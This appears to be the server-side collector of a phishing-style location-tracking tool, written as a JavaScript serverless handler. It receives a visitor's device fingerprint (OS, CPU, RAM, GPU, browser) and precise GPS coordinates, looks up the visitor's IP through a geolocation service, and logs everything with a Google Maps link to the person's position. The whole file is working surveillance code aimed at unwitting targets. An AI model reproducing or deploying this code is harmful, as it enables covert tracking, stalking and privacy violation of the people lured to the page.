const R = "\x1b[31m";
const G = "\x1b[32m";
const C = "\x1b[36m";
const Y = "\x1b[33m";
const W = "\x1b[0m";

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  const data = JSON.parse(event.body || "{}");

  const {
    Os, Ptf, Cc, Ram, Ven, Ren, Ht, Wd, Brw,
    Status, Lat, Lon, Acc, Alt, Dir, Spd, Error
  } = data;

  const clientIp =
    event.headers["x-forwarded-for"]?.split(",")[0] || "Unknown IP";

  // Fetch IP geo info
  let ipInfo = {};
  try {
    const geoRes = await fetch(`https://ipapi.co/${clientIp}/json`);
    ipInfo = await geoRes.json();
  } catch (err) {
    console.log(`${R}[-] Failed to fetch IP info: ${err}${W}`);
  }

  // Device Info
  console.log(`${Y}[!] Device Information :${W}`);
  console.log(`${G}[+] ${C}OS         : ${W}${Os}`);
  console.log(`${G}[+] ${C}Platform   : ${W}${Ptf}`);
  console.log(`${G}[+] ${C}CPU Cores  : ${W}${Cc}`);
  console.log(`${G}[+] ${C}RAM        : ${W}${Ram}`);
  console.log(`${G}[+] ${C}GPU Vendor : ${W}${Ven}`);
  console.log(`${G}[+] ${C}GPU        : ${W}${Ren}`);
  console.log(`${G}[+] ${C}Resolution : ${W}${Ht}x${Wd}`);
  console.log(`${G}[+] ${C}Browser    : ${W}${Brw}`);
  console.log(`${G}[+] ${C}Public IP  : ${W}${clientIp}`);

  // IP Info
  if (ipInfo && ipInfo.ip) {
    console.log(`${Y}[!] IP Information :${W}`);
    console.log(`${G}[+] ${C}Continent : ${W}${ipInfo.continent_name}`);
    console.log(`${G}[+] ${C}Country   : ${W}${ipInfo.country_name}`);
    console.log(`${G}[+] ${C}Region    : ${W}${ipInfo.region}`);
    console.log(`${G}[+] ${C}City      : ${W}${ipInfo.city}`);
    console.log(`${G}[+] ${C}Org       : ${W}${ipInfo.org}`);
    console.log(`${G}[+] ${C}ISP       : ${W}${ipInfo.org}`);
  }

  // Location Info
  if (Status === "success") {
    console.log(`${Y}[!] Location Information :${W}`);
    console.log(`${G}[+] ${C}Latitude  : ${W}${Lat}`);
    console.log(`${G}[+] ${C}Longitude : ${W}${Lon}`);
    console.log(`${G}[+] ${C}Accuracy  : ${W}${Acc}`);
    console.log(`${G}[+] ${C}Altitude  : ${W}${Alt}`);
    console.log(`${G}[+] ${C}Direction : ${W}${Dir}`);
    console.log(`${G}[+] ${C}Speed     : ${W}${Spd}`);
    console.log(
      `${G}[+] ${C}Google Maps : ${W}https://www.google.com/maps/place/${Lat?.replace(
        " deg",
        ""
      )}+${Lon?.replace(" deg", "")}`
    );
  } else {
    console.log(`${R}[-] ${C}Location Error: ${R}${Error}${W}`);
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ success: true }),
  };
}
